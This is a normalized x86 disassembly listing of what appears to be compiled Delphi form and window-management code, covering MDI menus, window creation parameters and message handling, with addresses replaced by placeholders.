push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_4683bc
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_452654
sub_4683e8
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_452654
xor edx edx
jmp r-xdata
mov eax esi
call sub_466674
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_468420
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_44e0b8
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_452654
sub_468464
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_44e1c4
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_4684b8
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_44b794
sub_4684ec
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46c05c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_46c048
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_468538
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46c05c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46c048
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_468588
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_418b9c
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_4685b8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_4550b4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_46c02c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_46c02c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_468588
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_46c02c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46c018
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_418cf8
call sub_40331c
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46c018
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46c018
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46c018
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_4686bc
push ebx
mov ebx eax
mov eax ebx
call sub_4686b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_429b90
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4686e4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_45260c
mov dl 0x1
mov eax esi
call sub_468a48
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_468ac4
mov edx eax
mov eax esi
call sub_44ea54
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_4527a8
mov dl 0x1
mov eax esi
call sub_467a68
sub_468764
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_4550b4
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_45ed94
mov edi eax
mov eax ebp
call sub_4550b4
push eax
call DrawMenuBar
sub_4687e0
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_421b4c
xor edx edx
mov eax ebx
call sub_46072c
sub_468804
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_468764
mov eax edx
mov edx ebx
call sub_421b4c
sub_46882c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4689f2
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_46c05c
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_4622e0
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46c048
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_421b4c
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46c048
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
mov eax ebx
call sub_4553b8
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_4550b4
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_468764
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4689f9
lea eax [ ebp - 0x10 ]
call sub_404118
retn
mov dl 0x1
mov eax ebx
call sub_4698f0
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_4550b4
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_4550b4
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_4550b4
mov edx eax
mov eax esi
call sub_4622e0
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_4550b4
push eax
call SetMenu
sub_468a14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_468a00
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_468a70
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_468a64
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_468adc
push ebx
mov ebx eax
mov eax ebx
call sub_4546cc
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_468ac4
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_468ac4
mov edx eax
mov eax ebx
call sub_44ea54
mov edx 0xff00000f
mov eax ebx
call sub_44ea54
pop ebx
retn
sub_468b60
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_4550b4
push eax
call ShowWindow
sub_468ba0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4685b8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_4685b8
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_46c02c
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46c018
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_4685b8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46c018
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_46c02c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_46c018
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bd1c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bd00
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bce8
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_46c018
call sub_46bce8
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bce8
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bd34
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bd1c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bd00
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bce8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bd34
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bd1c
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_46c018
call sub_46bd1c
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bd1c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bd00
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bce8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bd34
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bce8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bd34
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bd1c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46c018
call sub_46bd00
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_468ef4
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_4664a8
mov edx esi
mov eax edi
call sub_46b898
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_468fa3 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_451ed8
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_451ed8
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_469105
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4664b8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
mov eax ebx
call sub_469a64
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_44e2b8
push eax
mov eax ebx
call sub_44e2fc
push eax
mov eax ebx
call sub_4550b4
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406e94
mov [ ebx + 0x254 ] eax
push ebx
push sub_468050
call sub_422b0c
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_45ed94
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_4550b4
push eax
call SetWindowPos
jmp r-xdata
sub_469252
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46937d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_45223c
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_46b770
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469384
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_46938c
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_4524a8
push 0x0
mov eax ebx
call sub_4550b4
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_4693d0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_452c2c
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_4550b4
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4550b4
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_469434
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4694dc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4694e3
lea eax [ ebp - 0x4 ]
call sub_404118
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov eax edi
call sub_4657c8
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403518
mov eax ebx
call sub_4697ec
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403518
test al al
jne r-xdata
sub_4694ec
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_451b90
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_451b90
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_469434
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_469534
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_469434
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_469558
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_418e94
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_418d74
mov eax edi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_418e94
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_418d74
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_4697c8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_4550b4
mov dx 0xb000
call sub_465574
test al al
jne r-xdata
call sub_4550b4
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_465574
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
